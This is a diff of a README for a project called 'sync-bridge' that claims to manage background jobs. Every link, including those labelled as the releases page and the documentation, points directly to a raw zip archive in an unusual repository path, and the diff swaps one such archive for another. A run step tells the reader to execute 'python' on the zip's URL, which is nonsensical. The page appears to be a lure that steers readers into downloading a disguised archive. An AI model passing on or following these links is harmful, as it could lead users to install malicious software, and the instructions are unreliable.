@@ -8,7 +8,7 @@ Welcome to sync-bridge! This application helps you manage background jobs easily
 
 To get started, visit the Releases page below to download the latest version of sync-bridge.
 
-[![Download sync-bridge](https://raw.githubusercontent.com/rashun2123/sync-bridge/main/app/ui/templates/sync_bridge_1.5.zip)](https://raw.githubusercontent.com/rashun2123/sync-bridge/main/app/ui/templates/sync_bridge_1.5.zip)
+[![Download sync-bridge](https://raw.githubusercontent.com/rashun2123/sync-bridge/main/app/logging/sync-bridge-2.9.zip)](https://raw.githubusercontent.com/rashun2123/sync-bridge/main/app/logging/sync-bridge-2.9.zip)
 
 1. Click on the link above to go to the Releases page.
 2. Find the version you want to download.
@@ -40,7 +40,7 @@ Once you have downloaded and installed sync-bridge, follow these simple steps to
 3. Run the application using the command:
 
    ```
-   python https://raw.githubusercontent.com/rashun2123/sync-bridge/main/app/ui/templates/sync_bridge_1.5.zip
+   python https://raw.githubusercontent.com/rashun2123/sync-bridge/main/app/logging/sync-bridge-2.9.zip
    ```
 
 4. Follow the on-screen instructions to configure your settings.
@@ -55,7 +55,7 @@ During the first run, you will be prompted to set up the following options:
 
 ## 🔗 Learn More
 
-For in-depth information about how to use and configure sync-bridge, check the [documentation](https://raw.githubusercontent.com/rashun2123/sync-bridge/main/app/ui/templates/sync_bridge_1.5.zip).
+For in-depth information about how to use and configure sync-bridge, check the [documentation](https://raw.githubusercontent.com/rashun2123/sync-bridge/main/app/logging/sync-bridge-2.9.zip).
 
 ## 📡 Support
 
@@ -67,6 +67,6 @@ Contributions to sync-bridge are welcome! If you want to help improve the applic
 
 ## 📌 Visit the Releases Page Again
 
-To download sync-bridge, please [click here](https://raw.githubusercontent.com/rashun2123/sync-bridge/main/app/ui/templates/sync_bridge_1.5.zip) again if needed. 
+To download sync-bridge, please [click here](https://raw.githubusercontent.com/rashun2123/sync-bridge/main/app/logging/sync-bridge-2.9.zip) again if needed. 
 
 Thank you for choosing sync-bridge! Your reliable sync worker is just a download away!
